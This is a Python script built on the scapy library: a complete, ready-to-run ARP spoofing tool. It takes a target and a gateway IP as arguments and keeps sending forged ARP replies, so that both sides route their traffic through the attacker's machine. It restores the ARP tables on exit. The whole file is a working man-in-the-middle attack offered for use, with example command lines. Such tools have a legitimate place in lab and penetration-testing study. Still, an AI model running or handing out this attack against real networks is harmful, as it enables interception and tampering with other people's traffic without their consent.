#!/use/bin/env python

import scapy.all as scapy
import time
import argparse
import textwrap
import ipaddress


# Function to parse command-line arguments and return them as an options object.
def get_arguments():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="-------------------------------------------------------------------------------------------------",
        epilog=textwrap.dedent('''\
-------------------------------------------------------------------------------------------------

e.g.:
A. Perform an ARP spoofing between a target and gateway: arp_spoof.py -t 10.10.1.101 -g 10.10.1.2
B. Display help and usage information: arp_spoof.py --help


'''))
    parser.add_argument("-t", "--target", dest="target", help="Target IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    # Validate the provided IP addresses
    try:
        ipaddress.IPv4Address(options.target)
        ipaddress.IPv4Address(options.gateway)
    except ipaddress.AddressValueError:
        parser.error("[-] Invalid IP address format for target or gateway.")
    return options


# Function to perform ARP scan on the specified IP range and return a list of clients.
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # Create an ARP request packet with the target IP.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Create an Ethernet frame for broadcast.
    arp_request_broadcast = broadcast / arp_request  # Combine Ethernet frame and ARP request.

    # Send the combined packet and receive responses.
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


# Create a ARP response set to redirect the flow of packets through attacker computer.
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# Create a ARP response set to restore the flow of packets through target computer.
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc= source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


# Parse command-line arguments and store them in the 'options' object.
options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

# Man-in-the-middle loop.
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip) # Tells target you are the router.
        spoof(gateway_ip, target_ip)  # Tells router you are the target.
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count), end="")
        time.sleep(2)
# Perform necessary cleanup and ARP table restoration.
except KeyboardInterrupt:
    print("\n[+] User interrupted. Restoring ARP tables...")
    restore(target_ip, gateway_ip)  # Gives target the right MAC address of the router.
    restore(gateway_ip, target_ip)  # Gives router the right MAC address of the target.
    print("[+] ARP tables restored.")


